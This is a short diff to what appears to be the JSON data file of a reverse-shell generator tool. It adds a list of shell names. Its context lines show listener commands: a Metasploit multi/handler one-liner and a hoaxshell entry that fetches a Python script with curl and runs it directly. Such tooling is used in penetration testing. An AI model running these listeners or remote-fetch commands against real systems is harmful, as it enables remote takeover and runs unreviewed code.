@@ -917,5 +917,6 @@
             {"name":"msfconsole", "command":"msfconsole -q -x \"use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit\"", "meta":["mac", "windows", "linux"]},
             {"name":"hoaxshell", "command":"python3 -c \"$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)\" -t cmd-curl -p {port}", "meta":["mac", "windows", "linux"]}
         
-    ]
+    ],
+    "shells": ["sh", "/bin/sh", "bash", "/bin/bash", "cmd", "powershell", "pwsh", "ash", "bsh", "csh", "ksh", "zsh", "pdksh", "tcsh", "mksh", "dash"]
 }
